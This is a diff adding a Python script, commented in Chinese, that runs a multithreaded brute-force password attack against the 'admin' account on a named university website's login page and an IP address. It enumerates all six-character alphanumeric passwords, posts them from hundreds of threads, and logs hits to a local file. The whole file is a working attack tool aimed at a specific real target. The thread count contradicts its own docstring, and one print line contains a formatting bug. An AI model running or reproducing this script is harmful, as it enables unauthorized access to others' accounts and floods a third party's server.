@@ -1,0 +1,88 @@
+"""
+多线程暴力破解网站密码，前提是知道登陆的账号
+1、使用一个队列作为缓存池，起一个线程进行随机生成密码，将密码保存到队列中，队列最大存储40000（目前随机生成密码的长度为6-7，字符范围数字，大小写字母）
+2、起10个线程进行post模拟登陆网站，登陆失败抓取网页中【密码不正确的消息】，进行保存到text文本中，如果密码破解成功，也保存到文本中
+"""
+
+from queue import Queue
+from threading import Thread
+from itertools import product
+import time
+from requests import post
+import bs4
+
+# 密码池
+passwordQueue = Queue()
+strPool = 'mnopqrstuvwxyzABCDEFGHIJKabcdefghijkl1234567890LMNOPQRSTUVWXYZ'
+url1 = 'http://210.43.128.199/weblogin.do'
+url = 'http://yx.ncwu.edu.cn/weblogin.do'
+username = 'admin'
+passError = '密码不正确!请重新输入'
+
+
+# 随机生成密码
+def AddQueue(l, r):
+    for repeat in range(l, r):
+        for ps in product(strPool, repeat=repeat):
+            queueLen = passwordQueue.qsize()
+            while queueLen > 40000:
+                print("sleep for a while ")
+                time.sleep(20)
+                queueLen = passwordQueue.qsize()
+                print('new size is {}'.format(queueLen))
+            passwordQueue.put_nowait(''.join(ps))
+    print('all password is finish')
+
+
+# 登陆
+def LoginNcwu():
+    while True:
+        try:
+            st = time.time()
+            password = passwordQueue.get_nowait()
+            t = int(time.time() - st)
+            if t > 5:
+                print("passwordQueue", t)
+            # 防止速度太快，进行休眠
+            time.sleep(1)
+            rs = post(url, data={'id': username, 'password': password}, allow_redirects=1)
+
+            try:
+                soup = bs4.BeautifulSoup(rs.text, 'lxml')
+                message = soup.find('span', attrs={'style': 'color: red'}).text
+                if passError == message:
+                    print(password, message)
+                    with open("d:/python/破解/msg.txt", 'a+', encoding='utf-8') as f:
+                        f.write('破解失败 ：%s \n' % password)
+                else:
+                    print('破解成功 : {}' % password)
+                    with open("d:/python/破解/msg.txt", 'a+', encoding='utf-8') as f:
+                        f.write('破解成功 : %s' % password + '\n')
+            except Exception as e:
+                time.sleep(1)
+                print('破解成功 : {}, {}'.format(password, e))
+                with open("d:/python/破解/msg.txt", 'a+', encoding='utf-8') as f:
+                    f.write('破解成功 : %s, %s\n' % (password, e))
+
+        except Exception as e:
+            print("queue is empty wait for a while {}".format(e))
+            time.sleep(2)
+
+
+def start():
+    threads = list()
+
+    threads.append(
+        Thread(target=AddQueue, args=(6, 7))
+    )
+
+    for i in range(800):
+        threads.append(
+            Thread(target=LoginNcwu)
+        )
+    for thread in threads:
+        thread.start()
+
+
+if __name__ == '__main__':
+    start()
